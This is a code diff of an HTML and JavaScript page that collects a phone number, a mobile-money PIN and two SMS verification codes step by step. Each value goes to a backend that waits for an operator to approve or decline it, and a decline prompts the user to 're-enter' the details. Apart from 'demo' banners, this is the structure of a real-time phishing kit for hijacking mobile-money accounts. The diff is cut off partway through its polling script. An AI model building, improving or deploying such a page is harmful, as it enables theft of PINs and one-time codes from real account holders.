@@ -1,396 +1,189 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verification Page</title>
-<style>
-* {
-  box-sizing: border-box;
-}
-
-:root {
-  --yellow: #ffcc00;
-  --teal: #00566d;
-  --white: #ffffff;
-  --text: #171717;
-  --muted: #667085;
-  --border: #d1d5db;
-}
-
-body {
-  margin: 0;
-  background: #f1f3f5;
-  font-family: Arial, sans-serif;
-  color: var(--text);
-}
-
-.header {
-  height: 135px;
-  background: var(--yellow);
-  border-top: 8px solid #111;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.logo {
-  border: 5px solid #111;
-  border-radius: 50%;
-  padding: 15px 35px;
-  font-size: 35px;
-  font-weight: 900;
-}
-
-.card {
-  width: calc(100% - 32px);
-  max-width: 520px;
-  margin: 25px auto;
-  background: var(--white);
-  border-radius: 30px;
-  padding: 28px 22px;
-  box-shadow: 0 10px 30px #00000010;
-}
-
-h1 {
-  text-align: center;
-  font-size: 28px;
-  margin: 10px 0 20px;
-}
-
-p {
-  text-align: center;
-  line-height: 1.6;
-  color: #414653;
-}
-
-.demo {
-  text-align: center;
-  font-size: 11px;
-  color: var(--muted);
-  margin-bottom: 20px;
-}
-
-label {
-  display: block;
-  font-weight: bold;
-  margin: 22px 0 10px;
-}
-
-input[type="tel"],
-input[type="text"] {
-  width: 100%;
-  height: 60px;
-  border: 2px solid var(--border);
-  border-radius: 12px;
-  padding: 0 14px;
-  font-size: 20px;
-  outline: none;
-}
-
-input:focus {
-  border-color: #2878d0;
-}
-
-.boxes {
-  display: flex;
-  justify-content: center;
-  gap: 9px;
-  margin: 25px 0;
-}
-
-.boxes input {
-  width: 58px;
-  height: 66px;
-  text-align: center;
-  padding: 0;
-  font-size: 25px;
-  border: 2px solid var(--border);
-  border-radius: 12px;
-  outline: none;
-}
-
-.boxes input:focus {
-  border-color: #2878d0;
-}
-
-button {
-  width: 100%;
-  height: 60px;
-  margin-top: 20px;
-  background: var(--yellow);
-  border: none;
-  border-radius: 12px;
-  font-size: 20px;
-  font-weight: bold;
-  cursor: pointer;
-  opacity: 1;
-  transition: opacity 0.2s ease;
-}
-
-button:disabled {
-  opacity: 0.45 !important;
-  cursor: not-allowed !important;
-  pointer-events: none;
-}
-
-/* Screenshot Accurate Progress Ring Component */
-.spinner {
-  width: 54px;
-  height: 54px;
-  margin: 25px auto 15px;
-  border: 5px solid #2d3748;
-  border-top-color: #38a169;
-  border-radius: 50%;
-  animation: spin 1.2s cubic-bezier(0.4, 0, 0.2, 1) infinite;
-}
-
-@keyframes spin {
-  from {
-    transform: rotate(0deg);
-  }
-  to {
-    transform: rotate(360deg);
-  }
-}
-
-
-.status {
-  text-align: center;
-  color: var(--teal);
-  font-weight: bold;
-  margin-top: 15px;
-}
-
-.error {
-  color: #b42318;
-  text-align: center;
-  margin-top: 10px;
-  font-weight: bold;
-}
-
-.notice {
-  background: #fff4ce;
-  padding: 15px;
-  border-radius: 12px;
-  line-height: 1.5;
-  font-size: 14px;
-  margin: 20px 0;
-}
-
-.hidden {
-  display: none !important;
-}
-
-.success {
-  text-align: center;
-  font-size: 60px;
-  color: #168348;
-}
-
-@media (max-width: 380px) {
-  .card {
-    padding: 22px 15px;
-  }
-  .boxes {
-    gap: 6px;
-  }
-  .boxes input {
-    width: 48px;
-    height: 58px;
-  }
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Page</title>
+    <style>
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f7f7f7; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; }
+        .header { background-color: #ffcc00; width: 100%; text-align: center; padding: 25px 0; position: absolute; top: 0; left: 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .demo-badge { border: 4px solid #000; border-radius: 50px; display: inline-block; padding: 10px 25px; font-weight: bold; font-size: 24px; letter-spacing: 1px; }
+        .card { background: white; border-radius: 20px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 35px 25px; margin-top: 100px; max-width: 400px; width: 85%; text-align: center; box-sizing: border-box; }
+        .warning { color: #d32f2f; font-size: 11px; margin-bottom: 25px; font-weight: bold; text-transform: uppercase; letter-spacing: 0.5px; line-height: 1.4; }
+        h1 { font-size: 28px; margin: 10px 0; color: #111; font-weight: 800; }
+        p { color: #555; font-size: 15px; line-height: 1.6; margin-bottom: 25px; }
+        .form-group { text-align: left; width: 100%; margin-bottom: 25px; }
+        label { font-weight: bold; font-size: 14px; display: block; margin-bottom: 10px; color: #222; text-transform: uppercase; letter-spacing: 0.3px; }
+        input { width: 100%; padding: 16px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; transition: border-color 0.2s, box-shadow 0.2s; font-weight: 500; }
+        input:focus { border-color: #ffcc00; box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.2); }
+        button { width: 100%; background-color: #ffcc00; border: none; border-radius: 14px; padding: 16px; font-size: 16px; font-weight: bold; color: #000; cursor: pointer; transition: background-color 0.2s, transform 0.1s; margin-top: 10px; }
+        button:active { transform: scale(0.98); }
+        button:disabled { background-color: #ffe680; color: #888; cursor: not-allowed; transform: none; }
+        .status-text { display: none; font-size: 14px; font-weight: bold; color: #b28500; margin-top: 20px; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 0.6; } 50% { opacity: 1; } 100% { opacity: 0.6; } }
+    </style>
 </head>
 <body>
 
-<header class="header">
-  <div class="logo">DEMO</div>
-</header>
-
-<main class="card">
-  <div class="demo">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
-
-  <!-- PAGE 1: PHONE NUMBER -->
-  <section id="page1">
-    <h1>Welcome</h1>
-    <p>Enter a nine-digit test number to begin the verification demonstration.</p>
-    <label for="phone">Test phone number</label>
-    <input id="phone" type="tel" inputmode="numeric" maxlength="9" placeholder="9 digits" autocomplete="off">
-    <button id="nextPhone" disabled="true">Next</button>
-  </section>
-
-  <!-- PAGE 2: DEMO PIN -->
-  <section id="page2" class="hidden">
-    <h1>Demo PIN</h1>
-    <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
-    <div class="boxes" id="pinBoxes"></div>
-    <div id="pinWaiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+    <div class="header">
+        <div class="demo-badge">DEMO</div>
     </div>
-    <div id="pinMessage" class="status"></div>
-  </section>
 
-  <!-- PAGE 3: FIRST DEMO CODE -->
-  <section id="page3" class="hidden">
-    <h1>Verification Demo</h1>
-    <p>Enter any test value to continue.</p>
-    <div class="notice">This is a simulated verification step. No SMS is sent.</div>
-    <label for="code1">Test value</label>
-    <input id="code1" type="text" autocomplete="off" placeholder="Enter a test value">
-    <button id="submitCode1" disabled="true">Continue</button>
-    <div id="code1Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+    <!-- STEP 0: Welcome Screen -->
+    <div id="step-welcome" class="card">
+        <div class="warning">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+        <h1>Welcome</h1>
+        <p>Enter a nine-digit test number to begin the verification demonstration.</p>
+        <div class="form-group">
+            <label>Test phone number</label>
+            <input type="tel" id="input-phone" placeholder="e.g. 777777777" maxlength="9">
+        </div>
+        <button id="btn-welcome">Next</button>
     </div>
-    <div id="code1Message" class="status"></div>
-  </section>
 
-  <!-- PAGE 4: SECOND DEMO CODE -->
-  <section id="page4" class="hidden">
-    <h1>Final Demo Step</h1>
-    <p>Enter any four test digits. Do not use an actual SMS code.</p>
-    <div class="boxes" id="code2Boxes"></div>
-    <div id="code2Waiting" class="hidden">
-      <div class="spinner"></div>
-      <div class="status">Waiting for demo approval...</div>
+    <!-- STEP 1: PIN Screen -->
+    <div id="step-pin" class="card" style="display: none;">
+        <div class="warning">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+        <h1>Demo PIN</h1>
+        <p>Enter any five test digits. Do not use your real mobile-money PIN.</p>
+        <div class="form-group">
+            <label>PIN Code</label>
+            <input type="password" id="input-pin" maxlength="5" placeholder="•••••">
+        </div>
+        <button id="btn-pin">Next</button>
+        <div id="status-pin" class="status-text">Waiting for demo approval...</div>
     </div>
-    <div id="code2Message" class="status"></div>
-  </section>
 
-  <!-- PAGE 5: SUCCESS -->
-  <section id="page5" class="hidden">
-    <div class="success">✓</div>
-    <h1>Demo Completed</h1>
-    <p>The verification sequence mockup concluded successfully.</p>
-  </section>
-</main>
-    
-<script>
-  let sessionId = null;
-  let currentStage = null;
-  let statusInterval = null;
+    <!-- STEP 2: Custom Text Value Screen -->
+    <div id="step-code1" class="card" style="display: none;">
+        <div class="warning">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+        <h1>Verification Demo</h1>
+        <p>Enter any test value to continue. This is a simulated verification step. No SMS is sent.</p>
+        <div class="form-group">
+            <label>Test value</label>
+            <input type="text" id="input-code1" placeholder="Enter text here">
+        </div>
+        <button id="btn-code1">Continue</button>
+        <div id="status-code1" class="status-text">Waiting for demo approval...</div>
+    </div>
 
-  // 1. Automatically fetch a clean backend session on startup
-  async function initSession() {
-    try {
-      const res = await fetch("/api/session", { method: "POST" });
-      const data = await res.json();
-      sessionId = data.sessionId;
-      console.log("Session loaded successfully:", sessionId);
-    } catch (err) {
-      console.error("Session initialization failed:", err);
-    }
-  }
-  initSession();
+    <!-- STEP 3: Final OTP Step Screen -->
+    <div id="step-code2" class="card" style="display: none;">
+        <div class="warning">DEMONSTRATION ONLY — NEVER ENTER REAL ACCOUNT CODES</div>
+        <h1>Final Demo Step</h1>
+        <p>Enter any four test digits. Do not use an actual SMS code.</p>
+        <div class="form-group">
+            <label>OTP Code</label>
+            <input type="text" id="input-code2" maxlength="4" placeholder="••••">
+        </div>
+        <button id="btn-code2">Submit</button>
+        <div id="status-code2" class="status-text">Waiting for demo approval...</div>
+    </div>
 
-  // 2. Main workflow routing engine - maps steps safely
-  async function handleFormSubmit(stage, payload, currentSectionId, nextSectionId) {
-    currentStage = stage; // Explicitly update memory tracking state
+    <!-- STEP 4: Success Screen -->
+    <div id="step-success" class="card" style="display: none;">
+        <div style="font-size: 54px; color: #ffcc00; margin-bottom: 15px; font-weight: bold;">✓</div>
+        <h1>Demo Completed</h1>
+        <p>The verification sequence mockup concluded successfully.</p>
+    </div>
 
-    const container = document.getElementById(currentSectionId);
-    if (!container) return;
+    <script>
+        let sessionId = null;
+        let currentStage = null;
+        let statusInterval = null;
+        let cachedPhone = "";
 
-    const inputField = container.querySelector("input");
-    const submitBtn = container.querySelector("button");
-    const spinnerText = container.querySelector(".loading-text") || container.querySelector("p:last-of-type");
-
-    // Freeze active elements to prevent double submissions
-    if (inputField) inputField.disabled = true;
-    if (submitBtn) {
-      submitBtn.disabled = true;
-      submitBtn.setAttribute("disabled", "true");
-      if (!submitBtn.dataset.originalText) {
-        submitBtn.dataset.originalText = submitBtn.innerText;
-      }
-      submitBtn.innerText = "Processing...";
-    }
-    if (spinnerText) spinnerText.style.display = "block";
-
-    try {
-      const response = await fetch("/api/approval-request", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ sessionId, stage, payload })
-      });
-      
-      const result = await response.json();
-      if (result.ok) {
-        // Handover operation directly to the server loop checker
-        startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinnerText);
-      } else {
-        resetUIElements(inputField, submitBtn, spinnerText);
-      }
-    } catch (error) {
-      console.error("Submission failed:", error);
-      resetUIElements(inputField, submitBtn, spinnerText);
-    }
-  }
-
-  // 3. Polling core with explicit button click restore points
-  function startPolling(currentSectionId, nextSectionId, inputField, submitBtn, spinnerText) {
-    if (statusInterval) clearInterval(statusInterval);
-
-    statusInterval = setInterval(async () => {
-      try {
-        const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
-        const result = await response.json();
-
-        // SCENARIO A: Approved -> Proceed smoothly to the next window view
-        if (result.status === "approved") {
-          clearInterval(statusInterval);
-          document.getElementById(currentSectionId).style.display = "none";
-          
-          const nextView = document.getElementById(nextSectionId);
-          if (nextView) nextView.style.display = "block";
-        } 
-        
-        // SCENARIO B: Declined -> Fully restore the click bindings and clear variables
-        else if (result.status === "declined" || result.status === `declined_${currentStage}`) {
-          clearInterval(statusInterval); // Instantly kill the waiting process loop
-
-          // Clear loading text indicators safely
-          if (spinnerText) spinnerText.style.display = "none";
-
-          // Fully clear and re-activate input field element
-          if (inputField) {
-            inputField.disabled = false;
-            inputField.removeAttribute("disabled");
-            inputField.value = ""; // Erase previous entry values
-            inputField.focus();
-          }
-
-          // Fully restore the Click functionality and styles for the Next/Continue button
-          if (submitBtn) {
-            submitBtn.disabled = false;
-            submitBtn.removeAttribute("disabled");
-            submitBtn.innerText = submitBtn.dataset.originalText || "Next";
-          }
-
-          // Trigger feedback notification window safely after the thread re-renders
-          setTimeout(() => {
-            alert("The details entered were incorrect. Please re-enter.");
-          }, 100);
+        // Automatically assign new tracking session token on load
+        async function fetchNewSession() {
+            try {
+                const res = await fetch("/api/session", { method: "POST" });
+                const data = await res.json();
+                sessionId = data.sessionId;
+                console.log("Active Session Token:", sessionId);
+            } catch (err) {
+                console.error("Session server instantiation error:", err);
+            }
         }
-      } catch (err) {
-        console.error("Server polling verification failed:", err);
-      }
-    }, 2500); // Verify state intervals every 2.5 seconds
-  }
+        fetchNewSession();
 
-  // Fallback interface restorer
-  function resetUIElements(input, btn, spin) {
-    if (input) {
-      input.disabled = false;
-      input.removeAttribute("disabled");
-    }
-    if (btn) {
-      btn.disabled = false;
-      btn.removeAttribute("disabled");
-      btn.innerText = btn.dataset.originalText || "Next";
-    }
-    if (spin) spin.style.display = "none";
-  }
-</script>
+        // Welcome Interface Handler (Transitions locally without calling API)
+        document.getElementById("btn-welcome").addEventListener("click", () => {
+            const phoneField = document.getElementById("input-phone");
+            const phoneVal = phoneField.value.trim();
+            if (!phoneVal || phoneVal.length < 5) return alert("Please enter a valid test phone number.");
+            
+            cachedPhone = phoneVal;
+            document.getElementById("step-welcome").style.display = "none";
+            document.getElementById("step-pin").style.display = "block";
+        });
+
+        // Stage 1 Action Trigger
+        document.getElementById("btn-pin").addEventListener("click", () => {
+            const pinVal = document.getElementById("input-pin").value.trim();
+            if (!pinVal) return alert("Please enter a test PIN.");
+            
+            executeApprovalDispatch("pin", { phone: cachedPhone, pin: pinVal }, "step-pin", "step-code1", "btn-pin", "status-pin", "input-pin");
+        });
+
+        // Stage 2 Action Trigger
+        document.getElementById("btn-code1").addEventListener("click", () => {
+            const textVal = document.getElementById("input-code1").value.trim();
+            if (!textVal) return alert("Please enter a custom value string.");
+            
+            executeApprovalDispatch("code1", { code1: textVal }, "step-code1", "step-code2", "btn-code1", "status-code1", "input-code1");
+        });
+
+        // Stage 3 Action Trigger
+        document.getElementById("btn-code2").addEventListener("click", () => {
+            const otpVal = document.getElementById("input-code2").value.trim();
+            if (!otpVal) return alert("Please enter a test verification code.");
+            
+            executeApprovalDispatch("code2", { code2: otpVal }, "step-code2", "step-success", "btn-code2", "status-code2", "input-code2");
+        });
+
+        // Request Router Dispatcher
+        async function executeApprovalDispatch(stage, payload, currentCardId, nextCardId, btnId, statusId, inputId) {
+            currentStage = stage;
+            
+            const actionButton = document.getElementById(btnId);
+            const statusLabel = document.getElementById(statusId);
+            const inputField = document.getElementById(inputId);
+
+            // Turn off UI interaction layers securely
+            actionButton.disabled = true;
+            actionButton.setAttribute("disabled", "true");
+            if (inputField) {
+                inputField.disabled = true;
+                inputField.setAttribute("disabled", "true");
+            }
+            statusLabel.style.display = "block";
+
+            try {
+                const response = await fetch("/api/approval-request", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ sessionId, stage, payload })
+                });
+                const result = await response.json();
+                
+                if (result.ok) {
+                    initiateVerificationPolling(currentCardId, nextCardId, actionButton, statusLabel, inputField);
+                } else {
+                    restoreInterfaceNode(actionButton, statusLabel, inputField);
+                }
+            } catch (err) {
+                console.error("Transmission error:", err);
+                restoreInterfaceNode(actionButton, statusLabel, inputField);
+            }
+        }
+
+        // Loop Monitor Engine for Admin Responses
+        function initiateVerificationPolling(currentCardId, nextCardId, actionButton, statusLabel, inputField) {
+            if (statusInterval) clearInterval(statusInterval);
+
+            statusInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`/api/status?sessionId=${sessionId}&stage=${currentStage}`);
+                    const result = await response.json();
+
 
